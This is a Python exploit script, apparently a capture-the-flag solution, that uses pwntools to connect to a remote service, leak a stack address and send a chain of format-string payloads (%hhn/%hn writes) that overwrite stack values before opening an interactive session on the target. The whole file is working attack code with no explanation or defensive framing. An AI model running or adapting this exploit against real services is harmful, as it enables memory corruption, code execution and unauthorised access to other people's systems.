from pwn import *
from PwnIOI import *
while 1:
#  s = remote('192.168.43.130',1234)
#  s=IOI(['192.168.43.130',1234])
  s= IOI(['200.200.200.106', 44444])
  def set(arg1,arg2):
    s.read_until('-->')
    s.write(arg1+'\n')
    s.read_until('-->')
    s.write(str(arg2)+'\n')

  stack = int(s.read_until('I')[-2-12:-2],16)
  log('STACK : 0x%x'%stack)
  s.write(str(stack+0x18+2)+'\n')
  offset = int(s.read_until('[')[-4:-2],16)
  log('Value : 0x%x'%offset)
  # 0xdb10 -- 0x3a
  dat1 = '%'+str(offset + 0x3a)+'x'
  dat1 += '%1$hhn'
  set(dat1,stack+0x18+2)
  dat2 = '%'+str(0xeb12)+'x'
  dat2 += '%1$hn'
  set(dat2,stack+0x18)
  #0xa567 -- 0xd
  dat3 = '%'+str(offset + 0xd)+'x'
  dat3 += '%9$hhn'
  set(dat3,stack+0x18)
  #re
  dat4 = '%'+str(0xeb10)+'x'
  dat4 += '%1$hn'
  set(dat4,stack+0x18)

  dat5 = '%'+str(0xb567)+'x'
  dat5 += '%9$hn'
  set(dat5,stack+0x18)
  for i in range(0,15-5):
    set('%1000000c',stack+0x18)
  s.interact()
